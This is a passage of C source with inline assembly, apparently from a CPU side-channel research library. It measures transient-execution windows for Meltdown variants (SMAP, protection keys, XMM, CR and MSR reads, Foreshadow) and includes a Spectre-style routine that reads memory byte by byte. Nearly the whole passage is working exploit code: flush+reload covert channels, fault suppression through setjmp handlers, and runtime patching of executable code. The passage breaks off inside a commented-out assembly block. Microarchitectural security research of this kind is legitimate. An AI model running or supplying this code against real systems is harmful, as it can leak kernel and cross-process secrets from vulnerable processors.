int __attribute__((optimize("-Os"))) libkdump_write_prepare(int pt, int flag) {
	// if about to set ro, store another data value first
	if (flag)
		asm volatile("movq $0x23000, (%%rcx)\n"
			"mfence\n" : : "c"(phys));

	// mark read-only with page-table/segment
	if (pt) {
		set_rw_flag(phys);
		return 0;
	}
	else
	// should use 32-bit if leveraging segment
		return -1;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"))) libkdump_xmm_prepare(size_t addr, int is_legal) {
	uint64_t *from = (uint64_t *)legal;
	*from = 0x0;
	uint64_t *to = (uint64_t *)(legal + 1);
	*to = 0x42000;
	legal++;

	if (is_legal)
		phys = legal;
	else
		phys = addr+1;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"))) libkdump_xmm_load_prepare(int ts_flag, int mp_flag, int expected_data) {
	int i;
	expected_data = expected_data << 12;
	asm volatile("movq %%rcx, %%xmm0" : : "c"(expected_data));

	size_t encoded = ts_flag | (mp_flag << 1);
	snprintf(buffer, sizeof(buffer), "%x %lx", 0xd, encoded);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
void __attribute__((optimize("-Os"))) libkdump_pk_prepare(size_t addr) {
	/*
	* Allocate a protection key:
	*/
	pkey = 1;

	/*
	* Disable access to any memory with "pkey" set,
	* even though there is none right now
	*/
	status = pkey_set(pkey, PKEY_DISABLE_ACCESS, 0);
	if (status)
		errExit("pkey_set");

	/*
	* Set the protection key on "buffer".
	* Note that it is still read/write as far as mprotect() is
	* concerned and the previous pkey_set() overrides it.
	*/
	status = pkey_mprotect((void *)addr, pkey);
	if (status == -1)
		errExit("pkey_mprotect");
}

void __attribute__((optimize("-Os"))) libkdump_pk_restore(size_t addr) {
	status = pkey_restore((void *)addr);
	if (status == -1)
		errExit("pkey_free");
}

// ---------------------------------------------------------------------------
size_t libkdump_get_data() {
	return (size_t)_mem;
}

// ---------------------------------------------------------------------------
void libkdump_prefetch_read_prepare(size_t addr) {
	// set last cache line as "phys"
	uint64_t *temp = (uint64_t *)(mem + 4096 + 64 * 63);
	*temp = phys;

	/// set slow-beginning load address
	temp = (uint64_t *)(mem - 64);
	*temp = (uint64_t)mem;
}

// ---------------------------------------------------------------------------
int libkdump_meltdown_smap(size_t legal_addr, int cache_level, int tlb_present) {
	size_t compiled_flag;

	compiled_flag = 1; // set smap flag first
	compiled_flag |= (size_t)cache_level << 1;
	compiled_flag |= (size_t)tlb_present << 3;

	snprintf(buffer, sizeof(buffer), "%x %lx", 0x4, phys);
	write(setexec, buffer, strlen(buffer));

	snprintf(buffer, sizeof(buffer), "%x %lx", 0x5, compiled_flag);
	write(setexec, buffer, strlen(buffer));

	snprintf(buffer, sizeof(buffer), "%x %lx", 0xf, legal_addr);
	return write(setexec, buffer, strlen(buffer));
}

int libkdump_meltdown_pk_kernel(size_t legal_addr, int cache_level, int tlb_present) {
	size_t compiled_flag;

	compiled_flag = 0; // set smap flag first
	compiled_flag |= (size_t)cache_level << 1;
	compiled_flag |= (size_t)tlb_present << 3;

	snprintf(buffer, sizeof(buffer), "%x %lx", 0x4, phys);
	write(setexec, buffer, strlen(buffer));

	snprintf(buffer, sizeof(buffer), "%x %lx", 0x5, compiled_flag);
	write(setexec, buffer, strlen(buffer));

	snprintf(buffer, sizeof(buffer), "%x %lx", 0xf, legal_addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_prefetch_read_signal_handler(size_t legal_addr, 
	int cache_level, int tlb_present, int expected_data, size_t *code_seq_addr) {
	if (code_seq_addr != NULL) {
		extern const char CODE_SEQUENCE[];
		*code_seq_addr = (size_t)CODE_SEQUENCE;
		return -1;
	}

	size_t retries = config.retries + 1;
	uint64_t start = 0, end = 0;
	int count[3] = {0, 0, 0};
	int i;

	if (to_test_kernel_mode == 1) {
		return libkdump_meltdown_smap(legal_addr, cache_level, tlb_present);
	}
	else if (to_test_kernel_mode == 2) {
		return libkdump_meltdown_pk_kernel(legal_addr, cache_level, tlb_present);
	}

	while (retries--) {
		libkdump_prepare_data_condition(legal_addr, cache_level, tlb_present);

		if (to_xmm_load_prepare)
			libkdump_xmm_load_prepare(1, 1, expected_data);

		flush(mem - 64);
		if (!setjmp(buf)) {
			asm volatile(
				"CODE_SEQUENCE:\n"
				"sub %%rbx, %%rcx\n"
				"sub $64, %%rbx\n" 
				"movq (%%rbx), %%rdi\n"
				"movq (%%rdi, %%rcx, 1), %%rcx\n"
				"movq (%%rdi, %%rcx, 1), %%rcx\n"
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				"add $1, %%rcx\n"  
				"sub $1, %%rcx\n"  
				: 
				: "c"(phys), "b"(mem)
				: "rax", "rdx", "rdi", "rsi", "r8", "r9", "xmm0", "xmm1");
		}

		i = expected_data;
		if (flush_reload(mem + i * 4096)) { // B
			count[0]++;
		}
		i = 0;
		if (flush_reload(mem + i * 4096)) { // 0
			count[1]++;
		}

		if (to_xmm_load_prepare)
			libkdump_xmm_load_prepare(0, 1, expected_data);
	}
	printf("0x%x - %d; 0x0 - %d\n", expected_data, count[0], count[1]);
	if (count[0] == 0 && count[1] == 0)
		return -1;
	else
		return (count[0] >= count[1]) ? expected_data : 0x0;
}

// ---------------------------------------------------------------------------
void libkdump_select_code_sequence(int type, void *code_seq_addr) {
	size_t base_addr, code_len;
	switch (type) {
		case MELTDOWN_STANDARD:
		case MELTDOWN_PK_USER:
		base_addr = (size_t)meltdown_depth_begin;
		code_len = (size_t)meltdown_depth_end - (size_t)meltdown_depth_begin;
		break;
		case MELTDOWN_WRITE:
		base_addr = (size_t)meltdown_write_begin;
		code_len = (size_t)meltdown_write_end - (size_t)meltdown_write_begin;
		break;
		case MELTDOWN_CR:
		base_addr = (size_t)meltdown_cr_begin;
		code_len = (size_t)meltdown_cr_end - (size_t)meltdown_cr_begin;
		break;
		case MELTDOWN_MSR:
		base_addr = (size_t)meltdown_msr_begin;
		code_len = (size_t)meltdown_msr_end - (size_t)meltdown_msr_begin;
		break;
		case MELTDOWN_XMM:
		base_addr = (size_t)meltdown_xmm_begin;
		code_len = (size_t)meltdown_xmm_end - (size_t)meltdown_xmm_begin;
		break;
		case MELTDOWN_XMM_LOAD:
		base_addr = (size_t)meltdown_xmm_load_begin;
		code_len = (size_t)meltdown_xmm_load_end - (size_t)meltdown_xmm_load_begin;
		break;
		case MELTDOWN_XMM_WAIT:
		base_addr = (size_t)meltdown_xmm_wait_begin;
		code_len = (size_t)meltdown_xmm_wait_end - (size_t)meltdown_xmm_wait_begin;
		break;
		case MELTDOWN_FORESHADOW:
		base_addr = (size_t)meltdown_depth_with_tsx_begin;
		code_len = (size_t)meltdown_depth_with_tsx_end - (size_t)meltdown_depth_with_tsx_begin;
		case MELTDOWN_PK_KERNEL:
		default:
		break;
	}

	if (code_len != 0)
		memcpy(code_seq_addr, (void *)base_addr, code_len);
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-O0"))) libkdump_window_measure(size_t addr, size_t legal_addr,
	int code_type, int cache_level, int tlb_flush, int expected_data) {
	phys = addr;
	legal = legal_addr;

	// if provided a legal address, library could set the data;
	// otherwise the application should set it instead.
	if (legal_addr != 0)
		*(uint64_t *)legal_addr = expected_data << 12;

	size_t code_seq_addr = 0;
	libkdump_prefetch_read_signal_handler(0, 0, 0, 0, &code_seq_addr);
	printf("code_seq_addr: 0x%lx\n", code_seq_addr);
	assert(mprotect((void *)((code_seq_addr >> 12) << 12), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
	libkdump_select_code_sequence(code_type, (void *)code_seq_addr);

	if (code_type == MELTDOWN_XMM)
		libkdump_xmm_prepare(addr, 0);
	else if (code_type == MELTDOWN_XMM_LOAD || code_type == MELTDOWN_XMM_WAIT)
		to_xmm_load_prepare = 1;
	else if (code_type == MELTDOWN_SMAP)
		to_test_kernel_mode = 1;
	else if (code_type == MELTDOWN_PK_KERNEL) {
		to_test_kernel_mode = 2;
		libkdump_pk_prepare(addr);
	}
	else if (code_type == MELTDOWN_PK_USER)
		libkdump_pk_prepare(addr);
	else if (code_type == MELTDOWN_WRITE)
		assert(mprotect((void *)((addr >> 12) << 12), 0x1000, PROT_READ) == 0);
	// else
	libkdump_prefetch_read_prepare(addr);
	// snprintf(buffer, sizeof(buffer), "%x %lx", 0xa, phys);
	// write(setexec, buffer, strlen(buffer));

	int i, j, r, error_score = 0;
	int window_size[MAX_MEASUREMENT], window_size_score[MAX_WINDOW_SIZE];
	for (i = 0; i < MAX_MEASUREMENT; i++)
		window_size[i] = 1000;
	for (i = 0; i < MAX_WINDOW_SIZE; i++)
		window_size_score[i] = 0;

	printf("preparation done\n");

	for (i = 0; i < config.measurements && i < MAX_MEASUREMENT; i++) {
		if (config.fault_handling == TSX) {
			r = libkdump_read_tsx();
		} else {
			r = libkdump_prefetch_read_signal_handler(legal_addr, cache_level, tlb_flush, expected_data, NULL);
		}

		if (r >= 0) {
			window_size[i] = r;
			window_size_score[r]++;
		}
		else {
			printf("[!] Unable to capture anything with covert channel!\n");
			window_size[i] = -1;
			error_score++;
		}
	}

	if (code_type == MELTDOWN_XMM_LOAD || code_type == MELTDOWN_XMM_WAIT)
		to_xmm_load_prepare = 0;
	if (code_type == MELTDOWN_PK_KERNEL || code_type == MELTDOWN_SMAP)
		to_test_kernel_mode = 0;
	if (code_type == MELTDOWN_PK_USER || code_type == MELTDOWN_PK_KERNEL)
		libkdump_pk_restore(addr);

	int max_v = 0, max_i = 0;

	for (i = 0; i < MAX_WINDOW_SIZE; i++) {
		if (window_size_score[i] == 0)
			continue;
		if (dbg)
			debug(INFO, "window_size_score[0x%x] = 0x%d\n",
				i, window_size_score[i]);
		if (window_size_score[i] > max_v) {
			max_v = window_size_score[i];
			max_i = i;
		}
	}
	return max_i;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-O0"))) libkdump_prefetch_read(size_t addr, void *legal_addr,
	int cache_level, int tlb_flush, int expected_data) {
	phys = addr;

	libkdump_prefetch_read_prepare(addr);
	// snprintf(buffer, sizeof(buffer), "%x %lx", 0xa, phys);
	// write(setexec, buffer, strlen(buffer));

	char res_stat[256];
	int i, j, r;
	for (i = 0; i < 256; i++)
		res_stat[i] = 0;

	for (i = 0; i < config.measurements; i++) {
		if (config.fault_handling == TSX) {
			r = libkdump_read_tsx();
		} else {
			r = libkdump_prefetch_read_signal_handler((size_t)legal_addr, cache_level, tlb_flush, expected_data, NULL);
		}
		res_stat[r]++;
	}
	int max_v = 0, max_i = 0;

	if (dbg) {
		for (i = 0; i < sizeof(res_stat); i++) {
			if (res_stat[i] == 0)
				continue;
			debug(INFO, "res_stat[%x] = %d\n",
				i, res_stat[i]);
		}
	}

	for (i = 1; i < 256; i++) {
		if (res_stat[i] > max_v && res_stat[i] >= config.accept_after) {
			max_v = res_stat[i];
			max_i = i;
		}
	}
	return max_i;
}

// ---------------------------------------------------------------------------
// spectre btb

#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif /* ifdef _MSC_VER */
#include <immintrin.h>

extern const char branch_meltdown_standard_begin[], branch_meltdown_standard_end[];
extern const char branch_meltdown_cr_begin[], branch_meltdown_cr_end[];
extern const char branch_meltdown_msr_begin[], branch_meltdown_msr_end[];
extern const char branch_meltdown_xmm_load_begin[], branch_meltdown_xmm_load_end[];
extern const char branch_meltdown_xmm_wait_begin[], branch_meltdown_xmm_wait_end[];

#define ADD_INST_LEN 4
#define SUB_INST_LEN 4
#define COVERT_CHANNEL_INST_LEN 4

size_t *xp = NULL;
size_t *xp1 = NULL;
size_t *xp2 = NULL;
size_t *xp3 = NULL;
size_t *xp4 = NULL;

// ---------------------------------------------------------------------------
void libkdump_insert_speculative_instruction(int code_type, int number, void *code_seq_addr) {
	size_t base_addr = (size_t)code_seq_addr, from_addr;
	size_t step_size, to_addr;

	switch (code_type) {
		case MELTDOWN_STANDARD:
		to_addr = base_addr + ((size_t)branch_meltdown_standard_end - (size_t)branch_meltdown_standard_begin);
		break;
		case MELTDOWN_CR:
		to_addr = base_addr + ((size_t)branch_meltdown_cr_end - (size_t)branch_meltdown_cr_begin); //MELTDOWN_CR_LEN;
		break;
		case MELTDOWN_MSR:
		to_addr = base_addr + ((size_t)branch_meltdown_msr_end - (size_t)branch_meltdown_msr_begin); //MELTDOWN_MSR_LEN;
		break;
		case MELTDOWN_XMM_LOAD:
		to_addr = base_addr + ((size_t)branch_meltdown_xmm_load_end - (size_t)branch_meltdown_xmm_load_begin); //MELTDOWN_XMM_LOAD_LEN;
		break;
		case MELTDOWN_XMM_WAIT:
		to_addr = base_addr + ((size_t)branch_meltdown_xmm_wait_end - (size_t)branch_meltdown_xmm_wait_begin); //MELTDOWN_XMM_WAIT_LEN;
		break;
		default:
		break;
	}

	if ((number % 2) == 1) {
		step_size = ADD_INST_LEN;
		from_addr = (size_t)branch_meltdown_standard_end; // This is the addr of ADD instruction
	}
	else {
		step_size = SUB_INST_LEN;
		from_addr = (size_t)branch_meltdown_standard_end + ADD_INST_LEN; // This is the addr of SUB instruction
	}

	to_addr += (number+1)/2 * ADD_INST_LEN + number/2 * SUB_INST_LEN - COVERT_CHANNEL_INST_LEN;
	base_addr = to_addr - step_size;

	// copy covert channel access inst to one ADD/SUB later
	memcpy((void *)to_addr, (void *)base_addr, COVERT_CHANNEL_INST_LEN);
	// copy ADD/SUB to to_addr
	memcpy((void *)base_addr, (void *)from_addr, step_size);
}

// ---------------------------------------------------------------------------
void libkdump_select_branch_code_sequence(int type, void *code_seq_addr) {
	size_t base_addr, code_len;
	switch (type) {
		case MELTDOWN_STANDARD:
		base_addr = (size_t)branch_meltdown_standard_begin;
		code_len = (size_t)branch_meltdown_standard_end - (size_t)branch_meltdown_standard_begin;
		break;
		case MELTDOWN_CR:
		base_addr = (size_t)branch_meltdown_cr_begin;
		code_len = (size_t)branch_meltdown_cr_end - (size_t)branch_meltdown_cr_begin;
		break;
		case MELTDOWN_MSR:
		base_addr = (size_t)branch_meltdown_msr_begin;
		code_len = (size_t)branch_meltdown_msr_end - (size_t)branch_meltdown_msr_begin;
		break;
		case MELTDOWN_XMM_LOAD:
		base_addr = (size_t)branch_meltdown_xmm_load_begin;
		code_len = (size_t)branch_meltdown_xmm_load_end - (size_t)branch_meltdown_xmm_load_begin;
		break;
		case MELTDOWN_XMM_WAIT:
		base_addr = (size_t)branch_meltdown_xmm_wait_begin;
		code_len = (size_t)branch_meltdown_xmm_wait_end - (size_t)branch_meltdown_xmm_wait_begin;
		break;
		default:
		break;
	}

	if (code_len != 0)
		memcpy(code_seq_addr, (void *)base_addr, code_len);
}

/* Report best guess in value[0] and runner-up in value[1] */
int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t value[2], 
	size_t tlb_preload_x, int cache_level, int tlb_flush, int expected_data, size_t *code_seq_addr) {
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t read_x, dummy_x;
	volatile uint8_t * addr;
	unsigned status;
	int count[3] = {0, 0, 0};

	if (code_seq_addr != NULL) {
		extern const char BRANCH_CODE_SEQUENCE[];
		*code_seq_addr = (size_t)BRANCH_CODE_SEQUENCE;
		return -1;
	}

	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (i = 0; i < 256; i++)
	  flush(mem + i * 0x1000); /* intrinsic for clflush instruction */

	for (j = config.retries; j > 0; j--) {
		*xp = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		*xp = (*xp | (*xp >> 16)); /* Set x=-1 if j&6=0, else x=0 */
		read_x = (~*xp & training_x) | (*xp & malicious_x) + (~*xp & 0x208);
		dummy_x = (0x200 & *xp) | (~*xp & 0x800);

		*xp = malicious_x;

		flush(xp);
		flush(xp1);
		flush(xp2);
		flush(xp3);
		flush(xp4);
		libkdump_flush_tlb_all();
		libkdump_prepare_data_condition(training_x, cache_level, tlb_flush);

		// option 1: conditional branch
		// if ((status = _xbegin()) == _XBEGIN_STARTED) {
		// __asm__ volatile (
		//   "mov %3, %%r8\n\t"
		//   // "clflush (%%r8)\n\t"
		//   "movq (%%r8), %%r8\n\t"
		//   "mov %1, %%r9\n\t"
		//   // "clflush (%%r9)\n\t"
		//   "mov %2, %%r11\n\t"
		//   "mfence\n\t"
		//   // "mov (%%r11), %%rax\n\t" // this instruction is not necessary; the only purpose is to put secret in cache
		//   "mov %0, %%r10\n\t"
		//   "mov $0x0, %%r8\n\t"

		//   "movq (%%r9), %%r9\n\t"
		//   "movq (%%r9), %%r9\n\t"
		//   "movq (%%r9), %%r9\n\t"
		//   "movq (%%r9), %%r9\n\t"
		//   "cmp (%%r9), %%r8\n\t"
		//   "jne TO_ADDR_END\n\t"
				// "BRANCH_CODE_SEQUENCE:\n\t"
		//   "TO_ADDR: movq (%%r11), %%r11\n\t"
		//   "movq (%%r10, %%r11, 1), %%r11\n\t"
		//   "movq (%%r10, %%rdx, 1), %%rdx\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   // "add $1, %%r11\n\t"
		//   // "sub $1, %%r11\n\t"
		//   "TO_ADDR_END: nop\n\t"
		//   :
		//   : "r" (array2), "r" (xp4), "r" (read_x), "r" (training_x), "d" (dummy_x)
		//   : "r8", "r9", "%r10", "%r11"
		// );
		// _xend();
		// }

		// option 2: exception after exception
		if (!setjmp(buf)) {
			__asm__ volatile (
				"mov %2, %%r11\n\t"
				"mov %0, %%r10\n\t"
				"movq $0x1, %%r9\n\t"
				"mfence\n\t"

				// "movq (%%r9), %%r9\n\t"
				"movq (%%r9), %%r9\n\t"
				"movq (%%r9), %%r9\n\t"
				"movq (%%r9), %%r9\n\t"
				"movq (%%r9), %%r9\n\t" // last movq is illegal
				"BRANCH_CODE_SEQUENCE:\n\t"
				"TO_ADDR: movq (%%r11), %%r11\n\t"
				"movq (%%r10, %%r11, 1), %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"add $1, %%r11\n\t"
				"sub $1, %%r11\n\t"
				"TO_ADDR_END: nop\n\t"
				:
				: "r" (mem), "r" (xp2), "r" (malicious_x)
				: "r8"
				);
		}

		// // option 3: retpoline
		// __asm__ volatile (
		// // "mov %3, %%r8\n\t"
		// // "clflush (%%r8)\n\t"
		// // "movq (%%r8), %%r8\n\t"
		// 	"mov %1, %%r9\n\t"
		// // "clflush (%%r9)\n\t"
		// 	"mov %2, %%r11\n\t"
		// 	"mfence\n\t"
		// // "mov (%%r11), %%rax\n\t" // this instruction is not necessary; the only purpose is to put secret in cache
		// 	"mov %0, %%r10\n\t"

		// 	"call set_up_target\n\t"
		// 	"movq (%%r9), %%r11\n\t"
				// "BRANCH_CODE_SEQUENCE:\n\t"
		// 	"movq (%%r11), %%r11\n\t"
		// 	"add $1, %%r11\n\t"
		// 	"sub $1, %%r11\n\t"
